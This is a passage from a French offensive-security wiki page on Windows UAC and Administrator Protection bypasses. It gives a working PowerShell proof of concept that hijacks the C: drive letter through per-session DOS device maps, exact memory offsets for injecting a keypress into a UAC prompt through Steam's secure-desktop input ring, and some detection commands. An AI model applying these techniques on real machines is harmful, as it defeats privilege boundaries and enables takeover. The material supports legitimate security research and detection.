- Rechercher `iscsiexe.dll` dans des emplacements **contrôlés par l’utilisateur**, tels que `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Corréler les lancements de `iscsicpl.exe` avec des processus enfants inattendus ou des chargements de DLL depuis des répertoires autres que les répertoires Windows habituels.

### Recherches plus récentes à examiner séparément

Certaines chaînes découvertes après 2024 ne ressemblent plus aux détournements classiques du registre `HKCU\Software\Classes`. Par exemple, l’empoisonnement du cache de contexte d’activation peut combiner un **remappage de lecteur** et une **redirection de DLL** pour passer d’une intégrité moyenne à une intégrité élevée via une interface utilisateur de confiance / des binaires à élévation automatique tels que `ctfmon.exe`, puis des cibles comme `fodhelper.exe`. Au lieu de reproduire ici le volumineux PoC, consultez les exemples de payload compacts dans :

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Détournement de lettre de lecteur via la carte des périphériques DOS par session d’ouverture de session dans Administrator Protection (preview)

> [!NOTE]
> En août 2026, Microsoft présente toujours Administrator Protection comme une **préversion Insider** : le déploiement d’octobre 2025 a été annulé et est prévu pour une date ultérieure. Avant de tester ces chaînes, vérifiez que **Admin Approval Mode with Administrator protection** est bien activé et que l’appareil a été redémarré ; une chaîne de version 25H2 standard ne prouve pas à elle seule que la fonctionnalité est active.<sup>[[10]](#references)</sup>

Pour connaître toute la surface d’attaque `RAiLaunchAdminProcess` / UIAccess sur les builds de préversion de Windows 11 25H2, consultez la page dédiée :

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 « Administrator Protection » utilise des jetons shadow-admin avec des cartes `\Sessions\0\DosDevices/<LUID>` propres à chaque session. Le répertoire est créé à la demande par `SeGetTokenDeviceMap` lors de la première résolution de `\??`. Si l’attaquant emprunte l’identité du jeton shadow-admin uniquement au niveau **SecurityIdentification**, le répertoire est créé avec l’attaquant comme **propriétaire** (hérite de `CREATOR OWNER`), ce qui permet de créer des liens de lettre de lecteur prioritaires sur `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Étapes :**

1. Depuis une session à faibles privilèges, appeler `RAiProcessRunOnce` pour lancer un `runonce.exe` shadow-admin sans invite.
2. Dupliquer son jeton principal en jeton **identification** et emprunter son identité lors de l’ouverture de `\??` afin de forcer la création de `\Sessions\0\DosDevices/<LUID>` sous la propriété de l’attaquant.
3. Créer un lien symbolique `C:` à cet emplacement pointant vers un stockage contrôlé par l’attaquant ; les accès ultérieurs au système de fichiers dans cette session résoudront `C:` vers le chemin de l’attaquant, permettant le détournement de DLL/fichier sans invite.

**PoC PowerShell (NtObjectManager) :**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Sur les hôtes de préversion, Administrator Protection enregistre les approbations et les échecs sous forme d’événements ETW **15031** et **15032** auprès du fournisseur `Microsoft-Windows-LUA`. Ces événements incluent le SID du demandeur, le chemin de l’application, le résultat, le compte administrateur géré et la méthode d’authentification. Les tentatives d’exploitation répétées ou les échecs de pilotage de l’interface utilisateur ne passent donc pas inaperçus.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Entrée du bureau sécurisé transmise via un anneau de mémoire partagée accessible en écriture

Un helper du bureau sécurisé peut compromettre l’invite UAC si un utilisateur à intégrité moyenne peut écrire dans son IPC d’entrée. Dans l’architecture Steam décrite, `IClientSecureDesktop::BStartStreaming` démarre `secure_desktop_capture.exe` en tant que SYSTEM sur `winsta0\winlogon`. Il expose `Global\SecureDesktopInput_mem-IPCWrapper` avec un accès `GENERIC_ALL` pour l’utilisateur ; le helper consomme les entrées de l’anneau et appelle `SendInput` sur le bureau sécurisé. C’est différent de UIAccess ou de la modification de `PromptOnSecureDesktop` : l’entrée est transmise par un processus qui s’exécute déjà sur ce bureau. Consultez le [bootstrap IPC du service](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) pour savoir comment le client atteint ce gestionnaire. <sup>[[15]](#references)[[16]](#references)</sup>

L’anneau comporte 128 emplacements de 173 octets. Ses compteurs d’écriture et de lecture se trouvent aux adresses `0x414` et `0x418`, et l’emplacement `N` à l’adresse `0x41c + 173*N`. Définissez le premier octet de l’emplacement sur `0` pour indiquer du texte en clair, copiez un `INPUT` Windows de 40 octets juste après, puis incrémentez le compteur d’écriture. Pour un administrateur à intégrité moyenne confronté à une invite de consentement, un événement clavier `Y` d’appui puis de relâchement peut activer le contrôle UAC affirmatif après le lancement d’un exécutable qui demande une élévation ; il ne peut pas répondre à une invite d’identification destinée à un utilisateur standard. Le **contrôle de consentement reste important** : le helper ne transmet l’entrée qu’après que l’utilisateur a approuvé son invite `InputEnabled` pour la période d’autorisation en cours de 90 jours. Une correspondance accessible en lecture et en écriture ne prouve pas à elle seule que l’entrée atteint l’invite ; comparez les compteurs de lecture avant et après un test contrôlé. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS : Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Fonctionnement du contrôle de compte d’utilisateur](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Collection de techniques de contournement de l’UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner de compatibilité et lanceur de contournements de l’UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adopte l’IA pour générer des portes dérobées PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Opération TrueChaos : exploitation d’un 0-day contre des cibles gouvernementales d’Asie du Sud-Est](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Contournement de la protection de l’administrateur Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Contourner l’UAC à l’aide de la tâche SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Contournements UnifiedConsent, TabTip et Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Protection de l’administrateur](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Appeler des serveurs RPC Windows locaux depuis .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte améliore CoolClient avec un rootkit de noyau Windows signé](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT : un cheval de Troie Windows entièrement indétectable conçu pour espionner, voler et terroriser](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Turning the Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoC de Turning the Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
